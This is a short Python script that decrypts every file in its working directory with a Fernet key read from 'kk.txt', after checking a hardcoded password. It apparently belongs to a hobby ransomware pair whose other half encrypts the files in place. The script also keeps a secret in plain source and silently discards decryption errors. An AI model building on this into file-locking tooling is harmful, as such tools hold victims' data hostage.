import os
from cryptography.fernet import Fernet
from getpass import getpass

files = [file for file in os.listdir() if (os.path.isfile(file) and file not in __file__ and file != "kk.txt")]

with open("kk.txt", 'rb') as k:
    key = k.read()

def decrypt(files, key):
    p1 = "ideeplyhatemaggot"
    p2 = getpass()

    if p2 == p1:

        for file in files:
            with open(file, 'rb') as fl:
                a = fl.read()

            try:
                aec = Fernet(key).decrypt(a)

                with open(file, 'wb') as fl:
                    fl.write(aec)
            except:
                pass


decrypt(files, key)
